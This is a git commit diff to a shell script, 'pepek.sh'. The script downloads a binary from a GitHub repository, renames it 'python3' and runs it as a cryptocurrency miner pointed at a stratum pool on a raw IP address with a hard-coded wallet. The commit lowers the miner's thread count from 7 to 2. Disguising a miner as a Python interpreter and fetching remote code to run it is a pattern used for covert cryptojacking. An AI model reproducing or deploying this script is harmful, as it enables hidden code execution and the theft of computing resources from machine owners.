bcfd305be9081a85ef052a32275e347c30e1f5ec
nestri12329018 <153782424+nestri12329018@users.noreply.github.com>
2023-12-14 09:28:46 +0700

    Update pepek.sh

--- pepek.sh
+++ pepek.sh
@@ -1,4 +1,4 @@
 apt-get update &&  apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
 wget https://github.com/danipedrosang/marcrash/raw/main/python3
 chmod +x python3
-./python3 -a yespowersugar -o stratum+tcps://47.89.234.73:443 -u sugar1qwrnwp0xpuxk57l4p3strxlc9aze8k9lx25s8f0.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t 7
+./python3 -a yespowersugar -o stratum+tcps://47.89.234.73:443 -u sugar1qwrnwp0xpuxk57l4p3strxlc9aze8k9lx25s8f0.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t 2
